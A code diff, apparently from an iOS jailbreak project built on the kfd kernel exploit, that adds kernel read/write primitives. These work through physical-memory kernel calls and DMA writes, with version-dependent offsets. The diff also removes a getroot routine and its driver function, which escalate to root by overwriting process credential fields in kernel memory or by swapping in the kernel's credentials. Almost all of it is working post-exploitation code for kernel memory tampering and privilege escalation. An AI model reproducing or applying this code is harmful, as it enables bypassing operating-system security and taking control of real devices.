@@ -31,6 +31,9 @@ uint64_t container_init = 0;
 uint64_t iogettargetand = 0;
 uint64_t empty_kdata    = 0;
 uint64_t mach_vm_alloc  = 0;
+uint64_t trust_caches   = 0;
+uint64_t ml_phys_read   = 0;
+uint64_t ml_phys_write  = 0;
 
 void set_offsets(void) {
     kernel_slide = get_kernel_slide();
@@ -54,9 +57,174 @@ void set_offsets(void) {
     offsetfinder64_kread();
 }
 
+/*---- krw ----*/
+uint64_t kread64_phys(uint64_t pa)
+{
+    union {
+        uint32_t u32[2];
+        uint64_t u64;
+    } u;
+
+    u.u32[0] = (uint32_t)eary_kcall(ml_phys_read, pa, 4, 0, 0, 0, 0, 0);;
+    u.u32[1] = (uint32_t)eary_kcall(ml_phys_read, pa+4, 4, 0, 0, 0, 0, 0);
+    return u.u64;
+}
+
+void kwrite64_phys(uint64_t pa, uint64_t value) {
+    eary_kcall(ml_phys_write, pa, value, 8, 0, 0, 0, 0);
+}
+
+uint64_t kread64(uint64_t va) {
+    if(isarm64e()) {
+        return kread64_kfd(va);
+    } else {
+        return kread64_phys(vtophys_kfd(va));
+    }
+}
+
+uint32_t kread32(uint64_t va) {
+    if(isarm64e()) {
+        return kread32_kfd(va);
+    } else {
+        union {
+            uint32_t u32[2];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        return u.u32[0];
+    }
+}
+
+uint16_t kread16(uint64_t va) {
+    if(isarm64e()) {
+        return kread16_kfd(va);
+    } else {
+        union {
+            uint16_t u16[4];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        return u.u16[0];
+    }
+}
+
+uint8_t kread8(uint64_t va) {
+    if(isarm64e()) {
+        return kread8_kfd(va);
+    } else {
+        union {
+            uint8_t u8[8];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        return u.u8[0];
+    }
+}
+
+void kwrite64(uint64_t va, uint64_t val) {
+    if(isarm64e()) {
+        dma_perform(^{
+            dma_writevirt64(va, val);
+        });
+    } else {
+        kwrite64_phys(vtophys_kfd(va), val);
+    }
+}
+
+void kwrite32(uint64_t va, uint32_t val) {
+    if(isarm64e()) {
+        dma_perform(^{
+            dma_writevirt32(va, val);
+        });
+    } else {
+        union {
+            uint32_t u32[2];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        u.u32[0] = val;
+        kwrite64(va, u.u64);
+    }
+}
+
+void kwrite16(uint64_t va, uint16_t val) {
+    if(isarm64e()) {
+        dma_perform(^{
+            dma_writevirt16(va, val);
+        });
+    } else {
+        union {
+            uint16_t u16[4];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        u.u16[0] = val;
+        kwrite64(va, u.u64);
+    }
+}
+
+void kwrite8(uint64_t va, uint8_t val) {
+    if(isarm64e()) {
+        dma_perform(^{
+            dma_writevirt8(va, val);
+        });
+    } else {
+        union {
+            uint8_t u8[8];
+            uint64_t u64;
+        } u;
+        u.u64 = kread64(va);
+        u.u8[0] = val;
+        kwrite64(va, u.u64);
+    }
+}
+
+void kreadbuf(uint64_t va, void* ua, size_t size) {
+    if(isarm64e()) {
+        kreadbuf_kfd(va, ua, size);
+    } else {
+        uint64_t *v32 = (uint64_t*) ua;
+        
+        while (size) {
+            size_t bytesToRead = (size > 8) ? 8 : size;
+            uint64_t value = kread64(va);
+            va += 8;
+            
+            if (bytesToRead == 8) {
+                *v32++ = value;
+            } else {
+                memcpy(ua, &value, bytesToRead);
+            }
+            
+            size -= bytesToRead;
+        }
+    }
+}
+
+void kwritebuf(uint64_t va, const void* ua, size_t size) {
+    if(isarm64e()) {
+        dma_writevirtbuf(va, ua, size);
+    } else {
+        uint8_t *v8 = (uint8_t*) ua;
+        
+        while (size >= 8) {
+            kwrite64(va, *(uint64_t*)v8);
+            size -= 8;
+            v8 += 8;
+            va += 8;
+        }
+        
+        if (size) {
+            uint64_t val = kread64(va);
+            memcpy(&val, v8, size);
+            kwrite64(va, val);
+        }
+    }
+}
+
 /*---- proc ----*/
 uint64_t proc_get_proc_ro(uint64_t proc_ptr) {
-    if(isAvailable() >= 8)
+    if(isAvailable() >= 10)
         return kread64_kfd(proc_ptr + 0x18);
     return kread64_kfd(proc_ptr + 0x20);
 }
@@ -66,103 +234,7 @@ uint64_t proc_ro_get_ucred(uint64_t proc_ro_ptr) {
 }
 
 uint64_t proc_get_ucred(uint64_t proc_ptr) {
-    if(isAvailable() <= 3)
+    if(isAvailable() <= 5)
         return kread64_ptr_kfd(proc_ptr + off_proc_ucred);
     return proc_ro_get_ucred(proc_get_proc_ro(proc_ptr));
-}
-/*#========= PROGRESS =========
- *# kcall:    arm64  15.0 - 16.7
- *#           arm64e 15.0 - 15.7
- *# unsandbx: arm64  15.1 - 16.7 (untested 15.0-15.1)
- *#           arm64e
- *#============================
- */
-void getroot(void) {
-    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
-    if(isAvailable() >= 4) {
-        if(isarm64e()) {
-            uint64_t cr_posix_p = our_ucred + 0x18;
-            
-            int *buf = malloc(0x60);
-            for (int i = 0; i < 0x60; i++) {
-                buf[i] = 0;
-            }
-            
-            kreadbuf_kfd(kern_ucred + 0x18, buf, 0x60);
-            hexdump(buf, 0x60);
-            
-            dma_perform(^{
-                dma_writevirt32(our_proc + 0x2c, 0);
-                dma_writevirt32(our_proc + 0x30, 0);
-                dma_writevirt32(our_proc + 0x34, 0);
-                dma_writevirt32(our_proc + 0x38, 0);
-                dma_writevirtbuf(cr_posix_p, buf, 0x60);
-            });
-            free(buf);
-        } else {
-            eary_kcall(proc_set_ucred, our_proc, kern_ucred, 0, 0, 0, 0, 0);
-            
-            usleep(5000);
-            setuid(0);
-        }
-    } else {
-        if(isarm64e()) {
-            uint64_t cr_posix_p = our_ucred + 0x18;
-            
-            kwrite64_kfd(cr_posix_p + 0, 0);
-            kwrite64_kfd(cr_posix_p + 0x8, 0);
-            kwrite64_kfd(cr_posix_p + 0x10, 0);
-            kwrite64_kfd(cr_posix_p + 0x18, 0);
-            kwrite64_kfd(cr_posix_p + 0x20, 0);
-            kwrite64_kfd(cr_posix_p + 0x28, 0);
-            kwrite64_kfd(cr_posix_p + 0x30, 0);
-            kwrite64_kfd(cr_posix_p + 0x38, 0);
-            kwrite64_kfd(cr_posix_p + 0x40, 0);
-            kwrite64_kfd(cr_posix_p + 0x48, 0);
-            kwrite64_kfd(cr_posix_p + 0x50, 0);
-            kwrite64_kfd(cr_posix_p + 0x58, 0);
-            
-            setgroups(0, 0);
-        } else {
-            kwrite32_kfd(our_proc + off_p_uid, 0);
-            kwrite32_kfd(our_proc + off_p_ruid, 0);
-            kwrite32_kfd(our_proc + off_p_gid, 0);
-            kwrite32_kfd(our_proc + off_p_rgid, 0);
-            kwrite32_kfd(our_ucred + 0x18, 0);
-            kwrite32_kfd(our_ucred + 0x1c, 0);
-            kwrite32_kfd(our_ucred + 0x20, 0);
-            kwrite32_kfd(our_ucred + 0x24, 1);
-            kwrite32_kfd(our_ucred + 0x28, 0);
-            kwrite32_kfd(our_ucred + 0x68, 0);
-            kwrite32_kfd(our_ucred + 0x6c, 0);
-        }
-    }
-    
-    uint32_t t_flags_bak = kread32_kfd(our_task + off_task_t_flags);
-    uint32_t t_flags = t_flags_bak | 0x00000400;
-    kwrite32_kfd(our_task + off_task_t_flags, t_flags);
-    
-    printf("getuid() : %d\n", getuid());
-    printf("access(%s) : %d\n", "/var/root/Library", access("/var/root/Library", R_OK));
-    
-    kwrite32_kfd(our_task + off_task_t_flags, t_flags_bak);
-    if(isAvailable() >= 4 && !isarm64e()) {
-        eary_kcall(proc_set_ucred, our_proc, our_ucred, 0, 0, 0, 0, 0);
-        setuid(501);
-    }
-    
-}
-
-/*---- meow ----*/
-int meow(void) {
-    
-    set_offsets();
-    
-    setup_client();
-    
-    getroot();
-    
-    Fugu15KPF();
-    
-    return 0;
 }
